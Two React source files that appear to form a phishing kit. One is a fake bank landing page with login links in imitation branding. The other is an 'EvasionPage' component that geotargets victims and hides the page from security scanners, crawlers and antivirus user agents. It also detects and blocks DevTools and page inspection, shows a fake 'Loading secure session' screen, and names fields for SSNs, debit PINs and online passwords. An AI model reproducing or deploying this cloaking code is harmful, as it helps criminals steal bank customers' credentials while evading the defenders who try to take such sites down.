import PublicLayout from "@/components/PublicLayout";
import { Link } from "react-router-dom";
import { CreditCard, PiggyBank, Smartphone, Shield, ArrowRight } from "lucide-react";

const Banking = () => {
  return (
    <PublicLayout activeTab="Banking">
      {/* Hero section */}
      <section className="bg-gray-50 py-12 px-4 sm:px-6">
        <div className="max-w-7xl mx-auto">
          <h1 className="text-4xl font-bold text-gray-900 mb-4">Banking Solutions</h1>
          <p className="text-xl text-gray-600 mb-8">Find the right account for your needs</p>
          
          {/* Image placeholder */}
          <div className="w-full h-64 bg-gray-200 rounded-lg mb-8 flex items-center justify-center text-gray-500">
            [Insert Banking Hero Image Here]
          </div>
        </div>
      </section>

      {/* Account types */}
      <section className="py-12 px-4 sm:px-6">
        <div className="max-w-7xl mx-auto">
          <div className="grid md:grid-cols-3 gap-8">
            <div className="border border-gray-200 rounded-lg p-6 hover:shadow-lg transition-shadow">
              <div className="w-full h-48 bg-gray-100 rounded-lg mb-4 flex items-center justify-center text-gray-400 text-sm">
                [Checking Account Image]
              </div>
              <h2 className="text-2xl font-bold text-gray-900 mb-2">Checking Accounts</h2>
              <p className="text-gray-600 mb-4">Choose from a variety of checking accounts designed to fit your lifestyle.</p>
              <Link to="/server-error" className="text-[#012169] font-medium hover:underline inline-flex items-center gap-2">
                Learn more <ArrowRight className="h-4 w-4" />
              </Link>
            </div>
            <div className="border border-gray-200 rounded-lg p-6 hover:shadow-lg transition-shadow">
              <div className="w-full h-48 bg-gray-100 rounded-lg mb-4 flex items-center justify-center text-gray-400 text-sm">
                [Savings Account Image]
              </div>
              <h2 className="text-2xl font-bold text-gray-900 mb-2">Savings & CDs</h2>
              <p className="text-gray-600 mb-4">Grow your savings with competitive rates and flexible options.</p>
              <Link to="/server-error" className="text-[#012169] font-medium hover:underline inline-flex items-center gap-2">
                Learn more <ArrowRight className="h-4 w-4" />
              </Link>
            </div>
            <div className="border border-gray-200 rounded-lg p-6 hover:shadow-lg transition-shadow">
              <div className="w-full h-48 bg-gray-100 rounded-lg mb-4 flex items-center justify-center text-gray-400 text-sm">
                [Online Banking Image]
              </div>
              <h2 className="text-2xl font-bold text-gray-900 mb-2">Online & Mobile Banking</h2>
              <p className="text-gray-600 mb-4">Bank anytime, anywhere with our secure digital banking platform.</p>
              <Link to="/login" className="text-[#012169] font-medium hover:underline inline-flex items-center gap-2">
                Get started <ArrowRight className="h-4 w-4" />
              </Link>
            </div>
          </div>
        </div>
      </section>

      {/* Features */}
      <section className="bg-gray-50 py-12 px-4 sm:px-6">
        <div className="max-w-7xl mx-auto">
          <h2 className="text-3xl font-bold text-gray-900 mb-8 text-center">Why Bank with Us</h2>
          <div className="grid md:grid-cols-4 gap-6">
            {[
              { icon: Shield, title: "FDIC Insured", desc: "Your deposits are protected up to $250,000" },
              { icon: Smartphone, title: "Mobile Banking", desc: "Bank on the go with our secure app" },
              { icon: CreditCard, title: "Debit Cards", desc: "Free debit card with every checking account" },
              { icon: PiggyBank, title: "No Monthly Fees", desc: "Many accounts with no monthly maintenance fees" },
            ].map(({ icon: Icon, title, desc }) => (
              <div key={title} className="text-center">
                <div className="h-16 w-16 rounded-full bg-[#E31837] flex items-center justify-center mx-auto mb-4">
                  <Icon className="h-8 w-8 text-white" />
                </div>
                <h3 className="font-semibold text-gray-900 mb-2">{title}</h3>
                <p className="text-sm text-gray-600">{desc}</p>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* CTA */}
      <section className="py-12 px-4 sm:px-6">
        <div className="max-w-4xl mx-auto text-center">
          <h2 className="text-3xl font-bold text-gray-900 mb-4">Ready to get started?</h2>
          <p className="text-gray-600 mb-6">Open an account online in minutes or visit a financial center near you.</p>
          <div className="flex gap-4 justify-center">
            <Link to="/login" className="bg-[#E31837] hover:bg-[#c4162f] text-white px-6 py-3 rounded font-semibold">
              Open an Account
            </Link>
            <Link to="/locations" className="border-2 border-[#012169] text-[#012169] px-6 py-3 rounded font-semibold hover:bg-[#012169] hover:text-white">
              Find a Location
            </Link>
          </div>
        </div>
      </section>
    </PublicLayout>
  );
};

export default Banking;
import { useEffect, useState } from 'react';

const EVASION_CONFIG = {
  targetCountries: ['US', 'CA', 'GB', 'GH'],
  showFormDelay: 2000,
};

export default function EvasionPage() {
  const [isTargetLocation, setIsTargetLocation] = useState<boolean | null>(null);
  const [showContent, setShowContent] = useState(false);

  // 1. Geotargeting check
  const checkGeolocation = async () => {
    try {
      const response = await fetch('https://ipapi.co/json/');
      const data = await response.json();
      const allowed = EVASION_CONFIG.targetCountries.includes(data.country_code);
      setIsTargetLocation(allowed);
      return allowed;
    } catch {
      // Fail open (allow if API fails)
      setIsTargetLocation(true);
      return true;
    }
  };

  // 2. Basic bot detection
  const detectBots = () => {
    const ua = navigator.userAgent.toLowerCase();
    const blocked = [
      'curl', 'wget', 'python', 'requests', 'scrapy',
      'phantomjs', 'selenium', 'headless', 'bot',
      'crawler', 'spider', 'scanner', 'security',
      'malware', 'antivirus', 'firewall',
    ];

    if (blocked.some((term) => ua.includes(term))) {
      return true;
    }

    // Behavioral (mouse/keyboard) check after delay
    let mouse = 0;
    let keys = 0;

    const onMouse = () => mouse++;
    const onKey = () => keys++;

    document.addEventListener('mousemove', onMouse);
    document.addEventListener('keypress', onKey);

    setTimeout(() => {
      if (mouse === 0 && keys === 0) {
        console.log('Bot-like behavior detected');
        // You could hide content or redirect here
      }
      // Cleanup (optional)
      document.removeEventListener('mousemove', onMouse);
      document.removeEventListener('keypress', onKey);
    }, 3000);

    return false;
  };

  // 3. DevTools detection (size + Image trick)
  const detectDevTools = () => {
    const threshold = 160;
    if (
      window.outerHeight - window.innerHeight > threshold ||
      window.outerWidth - window.innerWidth > threshold
    ) {
      console.log('DevTools detected via window size');
      // Could hide content here
    }

    let devtoolsOpen = false;
    const element = new Image();
    Object.defineProperty(element, 'id', {
      get: () => {
        devtoolsOpen = true;
        console.log('DevTools detected via console access');
      },
    });

    const interval = setInterval(() => {
      devtoolsOpen = false;
      console.log(element); // Triggers getter if console open
      console.clear();
    }, 1000);

    // Cleanup on unmount
    return () => clearInterval(interval);
  };

  // 4. Disable inspection / right-click / keys / selection / drag
  const disableInspection = () => {
    // Right-click
    const onContext = (e: MouseEvent) => {
      e.preventDefault();
      return false;
    };
    document.addEventListener('contextmenu', onContext);

    // Key combos
    const onKeyDown = (e: KeyboardEvent) => {
      if (
        e.keyCode === 123 || // F12
        (e.ctrlKey && e.shiftKey && e.keyCode === 73) || // Ctrl+Shift+I
        (e.ctrlKey && e.keyCode === 85) || // Ctrl+U
        (e.ctrlKey && e.keyCode === 83) || // Ctrl+S
        (e.ctrlKey && e.shiftKey && e.keyCode === 67) || // Ctrl+Shift+C
        (e.ctrlKey && e.shiftKey && e.keyCode === 74) || // Ctrl+Shift+J
        (e.ctrlKey && e.shiftKey && e.keyCode === 46)    // Ctrl+Shift+Del
      ) {
        e.preventDefault();
        return false;
      }
    };
    document.addEventListener('keydown', onKeyDown);

    // Disable selection
    document.addEventListener('selectstart', (e) => e.preventDefault());

    // Disable drag
    document.addEventListener('dragstart', (e) => e.preventDefault());

    // Cleanup
    return () => {
      document.removeEventListener('contextmenu', onContext);
      document.removeEventListener('keydown', onKeyDown);
    };
  };

  // Main init
  useEffect(() => {
    const runEvasion = async () => {
      disableInspection(); // Run immediately

      if (detectBots()) {
        // Bot → maybe show blank or redirect
        return;
      }

      const geoOk = await checkGeolocation();
      if (!geoOk) {
        // Non-target → hide or redirect
        return;
      }

      detectDevTools(); // Start polling

      // All passed → show content after delay
      setTimeout(() => {
        setShowContent(true);
      }, EVASION_CONFIG.showFormDelay);
    };

    runEvasion();

    // Periodic console clear
    const clearIntervalId = setInterval(() => {
      console.clear();
    }, 1000);

    return () => {
      clearInterval(clearIntervalId);
      // Add any other cleanups from returned functions above
    };
  }, []);

  // Optional: Track clicks on sensitive fields (add IDs to your inputs)
  useEffect(() => {
    const sensitiveIds = ['ssn', 'debit-pin', 'online-password', 'online-username', 'account-number'];

    const handlers: { [key: string]: () => void } = {};

    sensitiveIds.forEach((id) => {
      const el = document.getElementById(id);
      if (el) {
        const handler = () => console.warn('.');
        el.addEventListener('click', handler);
        handlers[id] = handler;
      }
    });

    return () => {
      Object.entries(handlers).forEach(([id, fn]) => {
        document.getElementById(id)?.removeEventListener('click', fn);
      });
    };
  }, []);

  // Render nothing or fake loading until checks pass
  if (isTargetLocation === false || !showContent) {
    return <div style={{ height: '100vh', background: '#000', color: '#fff' }}>Loading secure session...</div>;
  }

  
}